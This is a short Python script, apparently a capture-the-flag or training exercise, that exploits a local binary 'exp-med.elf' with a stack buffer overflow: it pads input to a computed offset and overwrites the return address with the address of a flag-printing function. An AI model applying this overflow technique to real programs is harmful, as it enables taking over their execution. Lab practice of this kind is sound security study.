#!/usr/bin/python
# -*- coding: utf-8 -*-
import struct, socket, sys, telnetlib, subprocess, time

#p(0xdeadbeef) --> pack to 4byte little endian '\xef\xbe\xad\xde'
def p(a): return struct.pack("<I",a)

proc = subprocess.Popen(['./exp-med.elf'],executable='./exp-med.elf',stdin=subprocess.PIPE)

#Your Input Here

addr_print_flag = p(0x080484ad)
addr_print_flag = '\xad\x84\x04\x08'
offset = 0xffffcdac-0xffffc5a0
buf = 'A' * offset
buf += addr_print_flag

open('buf','wb').write(buf)
proc.stdin.write(buf+'\n')
